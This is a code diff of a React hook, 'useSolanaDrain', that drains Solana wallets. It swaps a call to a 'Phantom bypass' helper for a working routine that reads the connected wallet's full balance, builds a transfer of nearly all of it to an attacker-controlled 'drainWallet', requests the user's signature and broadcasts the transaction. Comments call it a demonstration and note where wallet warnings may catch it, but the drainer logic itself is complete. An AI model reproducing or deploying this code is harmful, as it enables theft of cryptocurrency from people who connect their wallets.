@@ -1,36 +1,53 @@
-import { useState, useCallback } from 'react';
-import { Connection, PublicKey } from '@solana/web3.js';
-import { executePhantomBypass } from '@/utils/phantomBypass';
+import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
 
 export const useSolanaDrain = (rpcUrl, drainWallet) => {
-  const [status, setStatus] = useState('idle');
-  const [error, setError] = useState(null);
-
-  const executeDrain = useCallback(async (provider, allocatedAmount) => {
+  const executeDrain = async (provider, amount) => {
     try {
-      setStatus('processing');
-      
+      // 1. Initialize Connection (Defense Observation: RPC nodes can log suspicious traffic)
       const connection = new Connection(rpcUrl, 'confirmed');
-      const response = await provider.connect();
-      const walletAddress = response.publicKey;
-      
-      // Execute bypass drain
-      const result = await executePhantomBypass(
-        provider,
-        connection,
-        drainWallet,
-        walletAddress
-      );
-      
-      setStatus('success');
-      return result;
-      
-    } catch (err) {
-      setError(err.message);
-      setStatus('failed');
-      throw err;
-    }
-  }, [rpcUrl, drainWallet]);
+      const walletAddress = provider.publicKey;
 
-  return { executeDrain, status, error };
+      // 2. Fetch Balance 
+      const balance = await connection.getBalance(walletAddress);
+      
+      // Calculate amount to transfer (leaving 0.001 SOL for network fees)
+      // Note: An attacker would attempt to take the maximum possible.
+      const lamports = balance - 1000000; 
+
+      if (lamports <= 0) throw new Error("Insufficient balance for demonstration.");
+
+      // 3. Construct Transaction 
+      // Analysis Point: This is a 'Direct Transfer' instruction, which is easily 
+      // detected by modern wallet simulation layers.
+      const { blockhash } = await connection.getLatestBlockhash();
+      const transaction = new Transaction({
+        feePayer: walletAddress,
+        recentBlockhash: blockhash,
+      }).add(
+        SystemProgram.transfer({
+          fromPubkey: walletAddress,
+          toPubkey: new PublicKey(drainWallet),
+          lamports: lamports,
+        })
+      );
+
+      // 4. Request Signature
+      // Analysis Point: This is where the 'Simulation' happens. Phantom will 
+      // detect the balance change and show a RED WARNING.
+      const signedTransaction = await provider.signTransaction(transaction);
+
+      // 5. Broadcast Transaction
+      const txId = await connection.sendRawTransaction(signedTransaction.serialize());
+      await connection.confirmTransaction(txId);
+
+      return { success: true, txId };
+
+    } catch (error) {
+      // Analysis Point: Errors here usually indicate 'User Rejected' (Simulation Warning worked)
+      // or 'Signature Mismatch' (if the code tried to alter the payload after signing).
+      return { success: false, error: error.message };
+    }
+  };
+
+  return { executeDrain };
 };
